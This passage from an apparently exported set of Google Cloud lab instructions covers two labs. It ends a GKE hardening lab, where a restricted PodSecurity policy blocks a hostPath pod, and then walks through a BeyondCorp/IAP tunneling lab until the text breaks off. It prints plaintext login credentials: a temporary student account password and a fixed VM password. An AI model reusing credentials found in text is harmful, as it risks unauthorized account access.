class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Error from server (Forbidden): error when creating "STDIN": pods "hostpath" is forbidden: violates PodSecurity "restricted:latest": allowPrivilegeEscalation != false (container "hostpath" must set securityContext.allowPrivilegeEscalation=false), unrestricted capabilities (container "hostpath" must set securityContext.capabilities.drop=["ALL"]), restricted volume types (volume "rootfs" uses restricted volume type "hostPath"), runAsNonRoot != true (pod or container "hostpath" must set securityContext.runAsNonRoot=true), seccompProfile (pod or container "hostpath" must set securityContext.seccompProfile.type to "RuntimeDefault" or "Localhost")</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 158px;"></div><div class="CodeMirror-gutters" style="display: none; height: 158px;"></div></div></div></pre><ol start='' ><li><p><span>Deploy another pod that meets the criteria of the </span><code>restrictive-psp</code><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat &lt;&lt;EOF | kubectl apply -f -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">apiVersion: v1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">kind: Pod</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">metadata:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  name: hostpath</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">spec:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  securityContext:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  runAsNonRoot: true  # Ensure a non-root user</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  runAsUser: 1000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  fsGroup: 2000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  seccompProfile:  # Add a seccomp profile</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  type: RuntimeDefault</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  containers:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  - name: hostpath</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  image: google/cloud-sdk:latest</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  command: ["/bin/bash"]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  args: ["-c", "tail -f /dev/null"]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  securityContext:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  allowPrivilegeEscalation: false</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  capabilities:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  drop: ["ALL"]</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EOF</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 495px;"></div><div class="CodeMirror-gutters" style="display: none; height: 495px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>(Output)</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">pod/hostpath created</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Deploy a blocked pod that mounts the host filesystem</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='congratulations-30'><span>Congratulations!</span></h2><p><span>In this lab you configured a default Kubernetes cluster in Google Kubernetes Engine. You then probed and exploited the access available to your pod, hardened the cluster, and validated those malicious actions were no longer possible.</span></p><p><span>### </span></p><h1 id='14---build-a-secure-google-cloud-network'><span>14 - Build a Secure Google Cloud Network</span></h1><p>&nbsp;</p><h2 id='lab---securing-virtual-machines-using-beyondcorp-enterprise-bce'><span>LAB - Securing Virtual Machines using BeyondCorp Enterprise (BCE)</span></h2><h2 id='overview-34'><span>Overview</span></h2><p><span>In this lab, you will learn how to use BeyondCorp Enterprise (BCE) and Identity-Aware Proxy (IAP) TCP forwarding to enable administrative access to VM instances that do not have external IP addresses or do not permit direct access over the internet.</span></p><h3 id='what-youll-learn-6'><span>What you&#39;ll learn</span></h3><ul><li><p><span>Enable IAP TCP forwarding in your Google Cloud project</span></p></li><li><p><span>Test connectivity to your Linux and Windows instances</span></p></li><li><p><span>Configure the required firewall rules for BCE</span></p></li><li><p><span>Grant permissions to use IAP TCP forwarding</span></p></li><li><p><span>Demonstrate tunneling using SSH and RDP connections</span></p></li></ul><h2 id='setup-4'><span>Setup</span></h2><h3 id='before-you-click-the-start-lab-button-17'><span>Before you click the Start Lab button</span></h3><p><span>Read these instructions. Labs are timed and you cannot pause them. The timer, which starts when you click </span><strong><span>Start Lab</span></strong><span>, shows how long Google Cloud resources will be made available to you.</span></p><p><span>This hands-on lab lets you do the lab activities yourself in a real cloud environment, not in a simulation or demo environment. It does so by giving you new, temporary credentials that you use to sign in and access Google Cloud for the duration of the lab.</span></p><p><span>To complete this lab, you need:</span></p><ul><li><p><span>Access to a standard internet browser (Chrome browser recommended).</span></p></li></ul><p><strong><span>Note:</span></strong><span> Use an Incognito or private browser window to run this lab. This prevents any conflicts between your personal account and the Student account, which may cause extra charges incurred to your personal account.</span></p><ul><li><p><span>Time to complete the lab---remember, once you start, you cannot pause a lab.</span></p></li></ul><p><strong><span>Note:</span></strong><span> If you already have your own personal Google Cloud account or project, do not use it for this lab to avoid extra charges to your account.</span></p><h3 id='how-to-start-your-lab-and-sign-in-to-the-google-cloud-console-12'><span>How to start your lab and sign in to the Google Cloud console</span></h3><ol start='' ><li><p><span>Click the </span><strong><span>Start Lab</span></strong><span> button. If you need to pay for the lab, a pop-up opens for you to select your payment method. On the left is the </span><strong><span>Lab Details</span></strong><span> panel with the following:</span></p><ul><li><p><span>The </span><strong><span>Open Google Cloud console</span></strong><span> button</span></p></li><li><p><span>Time remaining</span></p></li><li><p><span>The temporary credentials that you must use for this lab</span></p></li><li><p><span>Other information, if needed, to step through this lab</span></p></li></ul></li><li><p><span>Click </span><strong><span>Open Google Cloud console</span></strong><span> (or right-click and select </span><strong><span>Open Link in Incognito Window</span></strong><span> if you are running the Chrome browser).</span></p><p><span>The lab spins up resources, and then opens another tab that shows the </span><strong><span>Sign in</span></strong><span> page.</span></p><p><span>*</span><strong><span>Tip:</span><span>*</span></strong><span> Arrange the tabs in separate windows, side-by-side.</span></p><p><strong><span>Note:</span></strong><span> If you see the </span><strong><span>Choose an account</span></strong><span> dialog, click </span><strong><span>Use Another Account</span></strong><span>.</span></p></li><li><p><span>If necessary, copy the </span><strong><span>Username</span></strong><span> below and paste it into the </span><strong><span>Sign in</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">student-04-e5ae9b12916a@qwiklabs.net</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the </span><strong><span>Username</span></strong><span> in the </span><strong><span>Lab Details</span></strong><span> panel.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p></li><li><p><span>Copy the </span><strong><span>Password</span></strong><span> below and paste it into the </span><strong><span>Welcome</span></strong><span> dialog.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">AWZm7DHhCmiR</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the </span><strong><span>Password</span></strong><span> in the </span><strong><span>Lab Details</span></strong><span> panel.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To view a menu with a list of Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> at the top-left. </span><img src="images\nUxFb6oRFr435O3t6V7WYJAjeDFcrFb16G9wHWp5BzU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"></p><p><span>You will need a RDP client pre-installed so that you can connect and test Windows instances.</span></p><h2 id='task-1-enable-iap-tcp-forwarding-in-your-google-cloud-project'><span>Task 1. Enable IAP TCP forwarding in your Google Cloud project</span></h2><ol start='' ><li><p><span>Open the </span><strong><span>Navigation Menu</span></strong><span> and select </span><strong><span>APIs and Services &gt; Library.</span></strong></p></li><li><p><span>Search for </span><strong><span>IAP</span></strong><span> and select </span><strong><span>Cloud Identity-Aware Proxy API.</span></strong></p></li><li><p><span>Click </span><strong><span>Enable.</span></strong></p></li></ol><p><img src="images\frFS%2FFAb%2FOnrEw6JvbOul9inaWHcjGCINDlXIf23S84%3D" referrerpolicy="no-referrer" alt="Cloud Identity-Aware Proxy API"></p><h2 id='task-2-create-linux-and-windows-instances'><span>Task 2. Create Linux and Windows instances</span></h2><p><span>Create three instances for this lab: - Two for demonstration purposes (Linux and Windows) - One for testing connectivity (Windows)</span></p><h3 id='linux-instance'><span>Linux instance</span></h3><ol start='' ><li><p><span>From the </span><strong><span>Navigation Menu</span></strong><span> and select </span><strong><span>Compute Engine</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create instance</span></strong><span> and use the following configuration to create a VM. Leave the rest as default.</span></p></li></ol><ul><li><p><span>Name: </span><strong><span>linux-iap</span></strong></p></li><li><p><span>Zone: </span><strong><code>us-east4-a</code></strong></p></li></ul><ol start='' ><li><p><span>Click on </span><strong><span>Advanced options</span></strong><span> and select </span><strong><span>Networking</span></strong><span>. Under </span><strong><span>network interfaces</span></strong><span> click the defult network to edit. Then change the External IPV4 address to </span><strong><span>None</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p><p><img src="images\EYBOeI1oHeH6by7DMvWUi4aZqNj0CNGIPJj89%2BPpRvo%3D" referrerpolicy="no-referrer" alt="network interface fillout out"></p></li><li><p><span>Then click </span><strong><span>create</span></strong><span>. This VM will be referred to as </span><strong><span>linux-iap</span></strong></p></li></ol><h3 id='windows-instances'><span>Windows instances</span></h3><ol start='' ><li><p><span>To create the </span><strong><span>Windows Demo VM</span></strong><span> click </span><strong><span>Create instance</span></strong><span> and use the following configuration to create a VM. Leave the rest as default.</span></p></li></ol><ul><li><p><span>Name: </span><strong><span>windows-iap</span></strong></p></li><li><p><span>Zone: </span><strong><code>us-east4-a</code></strong></p></li><li><p><span>Under the </span><strong><span>boot disk</span></strong><span> section, click on </span><strong><span>Change</span></strong></p></li></ul><ol start='' ><li><p><span>For the OS, select the following:</span></p><ul><li><p><span>Public Images </span><strong><span>&gt;</span></strong><span> Operating system </span><strong><span>&gt;</span></strong><span> Windows Server</span></p></li><li><p><span>Version </span><strong><span>&gt;</span></strong><span> Windows Server 2016 Datacenter</span></p></li></ul><p><img src="images\zWBJlzl8Q5W%2BawOogvBjDqGR6do%2FANerOjcULzqwnKc%3D" referrerpolicy="no-referrer" alt="Windows Version Select"></p></li><li><p><span>Click </span><strong><span>Select</span></strong><span>.</span></p></li><li><p><span>Click on </span><strong><span>Advanced options</span></strong><span> and select </span><strong><span>Networking</span></strong><span>. Under </span><strong><span>network interfaces</span></strong><span> click the defult network to edit. Then change the External IPV4 address to </span><strong><span>None</span></strong><span>. Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Then click </span><strong><span>create</span></strong><span>. This VM will be referred to as </span><strong><span>windows-iap</span></strong></p></li><li><p><span>To create the </span><strong><span>Windows Connectivity VM</span></strong><span>, click </span><strong><span>Create instance</span></strong><span> and use the following configuration to create a VM. Leave the rest as default.</span></p></li></ol><ul><li><p><span>Name: </span><strong><span>windows-connectivity</span></strong></p></li><li><p><span>Zone: </span><strong><code>us-east4-a</code></strong></p></li><li><p><span>Under the </span><strong><span>boot disk</span></strong><span> section, click on </span><strong><span>Change</span></strong></p></li></ul><ol start='' ><li><p><span>For the OS, set the following on the </span><strong><span>Custom Images</span></strong><span> tab:</span></p><ul><li><p><span>Source project for images: </span><code>Qwiklabs Resources</code></p></li><li><p><span>Image: </span><code>iap-desktop-v001</code></p></li></ul></li><li><p><span>Click </span><strong><span>Select</span></strong><span>.</span></p></li><li><p><span>For access scopes, select </span><strong><span>Allow full access to all Cloud APIs</span></strong></p><p><strong><span>Do not</span></strong><span> disable external IP for this instance</span></p></li><li><p><span>Then click </span><strong><span>create</span></strong><span>. This VM will be referred to as </span><strong><span>windows-connectivity</span></strong></p></li></ol><p><span>Check if all 3 instances have been created</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-3-test-connectivity-to-your-linux-and-windows-instances'><span>Task 3. Test connectivity to your Linux and Windows instances</span></h2><ol start='' ><li><p><span>After the instances are created, You will test access to </span><strong><span>linux-iap</span></strong><span> and </span><strong><span>windows-iap</span></strong><span> to ensure that you aren’t able to access the VMs without the external IP.</span></p></li><li><p><span>For </span><strong><span>linux-iap</span></strong><span> click on the SSH button to get into the machine and ensure you get a message similar to the following.</span></p><p><img src="images\BUgJZz42%2Blh5BOfztdxaIGNOxuSJzrhM5nOLdeBbhTw%3D" referrerpolicy="no-referrer" alt="linux connection failed"></p></li><li><p><span>For </span><strong><span>windows-iap:</span></strong><span> click the RDP button and ensure you get a message similar to the following:</span></p><p><img src="https://cdn.qwiklabs.com/PlKmkge46380esSm%2BHO%2BkYmuukGqLzGGfnj1Y9LX78Y%3D" referrerpolicy="no-referrer" alt="windows connection failed"></p></li></ol><p><span>The following steps for configuring and using IAP will allow you to connect to the instances that don’t have external IPs.</span></p><h2 id='task-4-configure-the-required-firewall-rules-for-bce'><span>Task 4. Configure the required firewall rules for BCE</span></h2><ol start='' ><li><p><span>Open the </span><strong><span>Navigation Menu</span></strong><span> and select </span><strong><span>VPC Network &gt; Firewall</span></strong><span> and click </span><strong><span>Create Firewall Rule</span></strong></p></li><li><p><span>Configure the following settings:</span></p></li></ol><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Field</span></th><th style='text-align:left;' ><span>Setting</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><strong><span>allow-ingress-from-iap</span></strong></td></tr><tr><td style='text-align:left;' ><span>Direction of traffic</span></td><td style='text-align:left;' ><strong><span>Ingress</span></strong></td></tr><tr><td style='text-align:left;' ><span>Target</span></td><td style='text-align:left;' ><strong><span>All instances in the network</span></strong></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><strong><span>IPv4 Ranges</span></strong></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 Ranges</span></td><td style='text-align:left;' ><strong><span>35.235.240.0/20</span></strong></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><strong><span>Select TCP and enter 22, 3389</span></strong><span> to allow both SSH and RDP respectively</span></td></tr></tbody></table></figure><ol start='' ><li><p><span>Click </span><strong><span>CREATE</span></strong><span> to create the firewall rule.</span></p></li></ol><p><span>Check proper firewall rules have been created.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-5-grant-permissions-to-use-iap-tcp-forwarding'><span>Task 5. Grant permissions to use IAP TCP forwarding</span></h2><p><span>Use the following steps to configure the iap.tunnelResourceAccessor role by VM.</span></p><ol start='' ><li><p><span>Open </span><strong><span>Navigation Menu</span></strong><span> and select </span><strong><span>Security &gt; Identity-Aware Proxy</span></strong><span>, switch to the </span><strong><span>SSH and TCP Resources</span></strong><span> tab (safely ignore the Oauth Consent screen error in the HTTPS section).</span></p></li><li><p><span>Select the </span><strong><span>linux-iap</span></strong><span> and </span><strong><span>windows-iap</span></strong><span> VM instances.</span></p></li><li><p><span>Click </span><strong><span>Add principal</span></strong><span>, then enter in the service account associated with your </span><strong><span>Windows connectivity</span></strong><span> VM. This should be of the form </span><code>265347518016</code><span>-</span><a href='mailto:compute@developer.gserviceaccount.com' target='_blank' class='url'>compute@developer.gserviceaccount.com</a><span>.</span></p></li><li><p><span>Select </span><strong><span>Cloud IAP &gt; IAP-Secured Tunnel User</span></strong><span> for the role.</span></p></li><li><p><span>Click </span><strong><span>SAVE</span></strong><span>.</span></p></li><li><p><span>From the top-right of the page click the &quot;S&quot; icon to open your profile and copy the email of the student account.</span></p></li><li><p><span>Click </span><strong><span>Add principal</span></strong><span> again to add your student account.</span></p></li><li><p><span>Enter in the </span><strong><span>student account</span></strong><span>. You can copy this value from the lab details pane.</span></p></li><li><p><span>Select </span><strong><span>Cloud IAP &gt; IAP-Secured Tunnel User</span></strong><span> for the role.</span></p></li><li><p><span>Click </span><strong><span>SAVE</span></strong><span>.</span></p></li></ol><p><span>The IAP-Secured Tunnel User role will grant the windows-connectivity instance to connect to resources using IAP. Adding the student account will help verify the step was done correctly.</span></p><p><img src="images\AGyfsxvO5f%2F5dsiIKH%2F%2FT8gjoa1OiStOAiej1dwXvAM%3D" referrerpolicy="no-referrer" alt="Add Principals"></p><p><span>Check that IAM roles have been set for the service account.</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-5-use-iap-desktop-to-connect-to-the-windows-and-linux-instances'><span>Task 5. Use IAP Desktop to connect to the Windows and Linux instances</span></h2><p><span>It is possible to use IAP Desktop to connect to instances using a graphical user interface from an instance with Windows Desktop. You can read more about </span><a href='https://github.com/GoogleCloudPlatform/iap-desktop'><span>IAP Desktop</span></a><span> on the GitHub repository hosting the download for the tool.</span></p><p><span>To use IAP Desktop to connect to the instances in this lab:</span></p><ol start='' ><li><p><span>RDP to the </span><code>windows-connectivity</code><span> instance by downloading the RDP file. Go to the </span><strong><span>Compute Engine &gt; VM Instances</span></strong><span> page. Select the down arrow next to the </span><strong><span>windows-connectivity</span></strong><span> instance on the Compute Engine landing page and download the file.</span></p></li><li><p><span>Open the RDP file to connect to the instance via Remote Desktop Protocol. You will use the credentials below to connect to the instance once prompted:</span></p></li></ol><ul><li><p><span>Username: student</span></p></li><li><p><span>Password: Learn123!</span></p></li></ul><ol start='' ><li><p><span>Once connected to the </span><strong><span>windows-connectivity</span></strong><span> instance, locate and open the IAP Desktop application on the desktop of the instance.</span></p></li><li><p><span>Once the application opens, click on the sign in with Google button to log in. Use the username and password provided in the lab console to authenticate with </span><strong><span>IAP Desktop</span></strong><span>. Make sure you select the option to &quot;See, edit, configure and delete Google Cloud data.&quot;</span></p></li></ol><p><img src="images\1QtyF7%2B2Y7SvX4xtobOsSzE%2FLouBHJLxVMTPbY8UTho%3D" referrerpolicy="no-referrer" alt="oauth_permissions.png"></p><ol start='' ><li><p><span>You will need to add the project to connect to Compute Engine instances within IAP Desktop after authentication. Select the lab project associated with your lab instance:</span></p></li></ol><p><img src="images\pFRf3EjFJqgsJ58BPCTRpu2Eb7yIMuQtKmRiZ6PKzIU%3D" referrerpolicy="no-referrer" alt="add_project.png"></p><p><span>Double click on the </span><strong><span>windows-iap</span></strong><span> instance in the IAP Desktop application to log into the the instance.</span></p><ol start='' ><li><p><span>You may be prompted to provide credentials for the instance the first time you try to connect to it through IAP Desktop. Select &quot;Generate new credentials&quot; the first time logging into the instance.</span></p></li></ol><p><img src="images\Aq6XFqrQc%2BFkFpnS%2BBKC0Hmy5se%2F6vzDHAGFJGUTyvk%3D" referrerpolicy="no-referrer" alt="credentials.png"></p><ol start='' ><li><p><span>After the credentials are created you will be taken to the desktop of the </span><code>windows-iap</code><span> instance and can see the end user experience.</span></p></li></ol><p><img src="images\qI5Xc6iGs85ZuoxPle32U38JN9P0%2FZB4VuBogVMjPp4%3D" referrerpolicy="no-referrer" alt="windows_iap.png"></p><h2 id='task-6-demonstrate-tunneling-using-ssh-and-rdp-connections'><span>Task 6. Demonstrate tunneling using SSH and RDP connections</span></h2><ol start='' ><li><p><span>You will testconnectivity to the RDP instance using an RDP client. This is because you need to connect to the instance via an IAP tunnel locally.</span></p></li><li><p><span>Go to the </span><strong><span>Compute Engine &gt; VM Instances</span></strong><span> page.</span></p></li><li><p><span>For the </span><strong><span>windows-connectivity</span></strong><span> instance click the down arrow and select </span><strong><span>Set windows password</span></strong><span>. Copy the password and save it.</span></p></li></ol><p><span>Then click down arrow next to connect and click download the RDP file. Open the RDP file with your client and enter in your password.</span></p><ol start='' ><li><p><span>Once you have connected to the </span><strong><span>windows-connectivity</span></strong><span> instance. Open the </span><strong><span>Google Cloud Shell SDK</span></strong><span>:</span></p></li></ol><p><img src="images\BCl691Ssf881O549%2FagVx5beKV0CF109wpHLf%2BLOISM%3D" referrerpolicy="no-referrer" alt="Google Cloud SDK Shell desktop icon"></p><p><span>Now from the command line enter the following command to see if you can connect to the </span><strong><span>linux-iap instance</span></strong><span>:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute ssh linux-iap</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><strong><span>Y</span></strong><span> when promopted to continue and to select the zone.</span></p><p><span>Make sure that you select the right zone for the instance when prompted.</span></p><p><span>Then </span><strong><span>Accept</span></strong><span> the Putty security alert.</span></p><p><span>You should receive a message that no external IP 